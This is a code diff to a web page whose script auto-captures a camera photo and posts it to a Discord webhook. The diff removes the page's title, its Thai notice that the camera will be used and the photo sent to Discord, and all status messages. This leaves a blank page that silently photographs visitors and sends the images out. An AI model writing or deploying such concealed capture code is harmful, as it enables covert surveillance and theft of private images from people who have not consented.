@@ -32,10 +32,9 @@
 </head>
 <body>
 
-  <h1>Send Camera Capture to Discord</h1>
+  <h1></h1>
   <p class="note">
-    หน้าเว็บนี้จะเปิดกล้อง ถ่ายรูปอัตโนมัติ<br>
-    และส่งรูปเข้า Discord ให้ทันที
+    
   </p>
 
   <video id="video" playsinline autoplay style="display:none;"></video>
@@ -66,7 +65,7 @@
           };
         });
 
-        statusText.textContent = "กำลังถ่ายรูป...";
+        statusText.textContent = "";
         await new Promise(r => setTimeout(r, 800));
 
         const width  = video.videoWidth;
@@ -88,7 +87,7 @@
         form.append("file", blob, filename);
         form.append("content", "📸 Auto-captured from art.github.io");
 
-        statusText.textContent = "กำลังส่งรูปไป Discord...";
+        statusText.textContent = "";
 
         const res = await fetch(WEBHOOK_URL, {
           method: "POST",
@@ -96,9 +95,9 @@
         });
 
         if (res.ok) {
-          statusText.textContent = "ส่งรูปสำเร็จ! ไปดูใน Discord ได้เลย ✅";
+          statusText.textContent = "";
         } else {
-          statusText.textContent = "ส่งรูปไม่สำเร็จ ❌ Error: " + res.status;
+          statusText.textContent = ": " + res.status;
         }
 
         stream.getTracks().forEach(t => t.stop());
@@ -106,7 +105,7 @@
 
       } catch (err) {
         console.error(err);
-        statusText.textContent = "ไม่สามารถเข้าถึงกล้องได้ ❌";
+        statusText.textContent = "";
       }
     }
 
